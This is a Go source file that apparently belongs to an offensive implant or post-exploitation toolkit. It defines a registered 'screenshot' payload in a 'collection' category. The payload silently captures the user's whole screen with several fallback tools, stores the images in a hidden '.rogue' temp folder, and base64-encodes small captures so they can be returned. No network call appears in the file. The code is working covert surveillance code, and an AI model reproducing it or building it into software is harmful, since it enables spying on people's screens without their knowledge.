package payloads

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func init() {
	Register(&Screenshot{})
}

type Screenshot struct{}

func (s *Screenshot) Name() string     { return "screenshot" }
func (s *Screenshot) Category() string { return "collection" }
func (s *Screenshot) Description() string {
	return "Capture screen using import/xwd (Linux) or platform-specific tools"
}

func (s *Screenshot) Execute(args map[string]string) ([]byte, error) {
	result := s.capture()
	return MarshalJSON(result)
}

type screenshotResult struct {
	Timestamp string `json:"timestamp"`
	Method    string `json:"method"`
	FilePath  string `json:"filepath"`
	Size      int64  `json:"size_bytes"`
	Base64    string `json:"base64,omitempty"`
	Error     string `json:"error,omitempty"`
}

func (s *Screenshot) capture() *screenshotResult {
	r := &screenshotResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	outputDir := filepath.Join(os.TempDir(), ".rogue", "screenshots")
	os.MkdirAll(outputDir, 0700)
	filename := fmt.Sprintf("screenshot_%s.png", time.Now().Format("20060102_150405"))
	filepath := filepath.Join(outputDir, filename)

	// Method 1: import (ImageMagick)
	if imp, err := exec.LookPath("import"); err == nil {
		r.Method = "import (ImageMagick)"
		cmd := exec.Command(imp, "-window", "root", filepath)
		if err := cmd.Run(); err == nil {
			return s.finalize(r, filepath)
		}
	}

	// Method 2: xwd + convert
	if xwd, err := exec.LookPath("xwd"); err == nil {
		xwdFile := filepath + ".xwd"
		cmd := exec.Command(xwd, "-root", "-out", xwdFile)
		if err := cmd.Run(); err == nil {
			if convert, err := exec.LookPath("convert"); err == nil {
				exec.Command(convert, xwdFile, filepath).Run()
				os.Remove(xwdFile)
				if _, err := os.Stat(filepath); err == nil {
					r.Method = "xwd+convert"
					return s.finalize(r, filepath)
				}
			}
			// Fallback: return xwd
			filepath = xwdFile
			r.Method = "xwd"
			return s.finalize(r, filepath)
		}
	}

	// Method 3: scrot
	if scrot, err := exec.LookPath("scrot"); err == nil {
		scrotFile := filepath
		cmd := exec.Command(scrot, scrotFile, "-z") // -z = silent
		if err := cmd.Run(); err == nil {
			r.Method = "scrot"
			return s.finalize(r, scrotFile)
		}
	}

	// Method 4: gnome-screenshot
	if gnome, err := exec.LookPath("gnome-screenshot"); err == nil {
		cmd := exec.Command(gnome, "-f", filepath)
		if err := cmd.Run(); err == nil {
			r.Method = "gnome-screenshot"
			return s.finalize(r, filepath)
		}
	}

	r.Error = "No screen capture tool found (try: import, xwd, scrot, gnome-screenshot)"
	return r
}

func (s *Screenshot) finalize(r *screenshotResult, path string) *screenshotResult {
	fi, err := os.Stat(path)
	if err == nil {
		r.FilePath = path
		r.Size = fi.Size()
	}

	// Base64 encode small captures (< 1MB)
	if r.Size > 0 && r.Size < 1*1024*1024 {
		if data, err := os.ReadFile(path); err == nil {
			r.Base64 = base64.StdEncoding.EncodeToString(data)
		}
	}

	return r
}

// Force unused import suppression
var _ = strings.TrimSpace
